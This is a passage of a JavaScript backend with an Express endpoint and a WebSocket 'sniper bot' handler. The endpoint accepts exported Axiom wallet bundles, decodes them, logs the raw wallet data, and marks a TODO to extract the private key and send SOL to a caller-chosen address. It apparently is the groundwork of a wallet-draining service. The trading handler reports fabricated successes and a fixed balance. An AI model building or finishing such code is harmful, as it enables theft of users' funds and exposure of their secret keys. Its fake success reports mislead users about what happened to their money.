      activityId: importActivity.id
    });

  } catch (error) {
    console.error('❌ [FETCH-WALLET] Error:', error.message);
    res.status(500).json({ error: error.message });
  }
});

// ── New endpoint: Send SOL using Axiom importBundle ──
app.post("/send-sol-direct", async (req, res) => {
  console.log('\n💸 [SEND-DIRECT] Request received');
  console.log('[SEND-DIRECT] Body keys:', Object.keys(req.body).join(', '));
  console.log('[SEND-DIRECT] importBundle type:', typeof req.body.importBundle);
  console.log('[SEND-DIRECT] destination:', req.body.destination);

  try {
    const { importBundle, destination } = req.body;
    if (!importBundle || !destination) {
      console.log('❌ [SEND-DIRECT] Missing required fields');
      return res.status(400).json({ error: "importBundle and destination required" });
    }

    let dataField;
    
    // Case 1: importBundle is an object with data field
    if (typeof importBundle === 'object' && importBundle.data) {
      console.log('[SEND-DIRECT] Case 1: importBundle is object with data field');
      dataField = importBundle.data;
    }
    // Case 2: importBundle is a string
    else if (typeof importBundle === 'string') {
      console.log('[SEND-DIRECT] Case 2: importBundle is string, using directly');
      dataField = importBundle;
    }
    else {
      console.log('❌ [SEND-DIRECT] Invalid importBundle format');
      return res.status(400).json({ error: "importBundle must be object with data or string" });
    }

    console.log('[SEND-DIRECT] Data field length:', dataField?.length);
    console.log('[SEND-DIRECT] Data field preview:', dataField?.substring(0, 50));

    // Hex-decode wallet data
    let walletJson;
    try {
      walletJson = Buffer.from(dataField, 'hex').toString('utf8');
      console.log('[SEND-DIRECT] ✓ Hex-decoded');
    } catch (e) {
      console.log('[SEND-DIRECT] ❌ Hex decode failed:', e.message);
      return res.status(400).json({ error: "Failed to decode hex: " + e.message });
    }

    const wallet = tryParseJSON(walletJson);
    if (!wallet) {
      console.log('❌ [SEND-DIRECT] Invalid wallet data');
      console.log('[SEND-DIRECT] Raw walletJson:', walletJson);
      return res.status(400).json({ error: "Invalid wallet data" });
    }

    console.log('[SEND-DIRECT] Wallet parsed, keys:', Object.keys(wallet).join(', '));
    console.log('[SEND-DIRECT] Destination:', destination);
    
    // TODO: Extract private key and send actual SOL
    // For now return mock success with logging
    const txSignature = 'TODO_implement_' + Math.random().toString(36).substring(7);
    console.log('✅ [SEND-DIRECT] Complete - mock signature:', txSignature);
    
    res.json({
      status: "success",
      signature: txSignature,
      amount: "TBD",
      message: "Mock transfer - implement actual SOL send"
    });

  } catch (error) {
    console.error('❌ [SEND-DIRECT] Error:', error.message, error.stack);
    res.status(500).json({ error: error.message });
  }
});

const server = http.createServer(app);
const wss = new WebSocket.Server({ server });

// WebSocket handler for sniper bot
wss.on('connection', (ws) => {
  console.log('Sniper bot connected via WebSocket');
  
  ws.on('message', async (message) => {
    try {
      const msg = JSON.parse(message);
      console.log('WS message:', msg.type);
      
      switch (msg.type) {
        case 'get_balance':
          // Mock balance for now - in production, fetch from actual wallet
          ws.send(JSON.stringify({ type: 'balance', balance: '0.5' }));
          break;
          
        case 'update_settings':
          ws.send(JSON.stringify({ type: 'settings_ack', status: 'ok' }));
          break;
          
        case 'buy':
          ws.send(JSON.stringify({ 
            type: 'trade_result', 
            status: 'success', 
            message: 'Trade executed',
            ca: msg.ca,
            amount: msg.amount,
            txid: 'mock_tx_' + Date.now()
          }));
          break;
          
        case 'emergency_sell_all':
          ws.send(JSON.stringify({ 
            type: 'trade_result', 
            status: 'success', 
            message: 'Emergency sell executed'
          }));
          break;
          
        default:
          console.log('Unknown message type:', msg.type);
      }
    } catch (err) {
      console.error('WS error:', err);
      ws.send(JSON.stringify({ type: 'error', message: err.message }));
    }
  });
  
  ws.on('close', () => {
    console.log('Sniper bot disconnected');
  });
});

server.listen(port, () => {
  console.log(`Backend listening on http://localhost:${port}`);
  console.log(`WebSocket available at ws://localhost:${port}`);
});
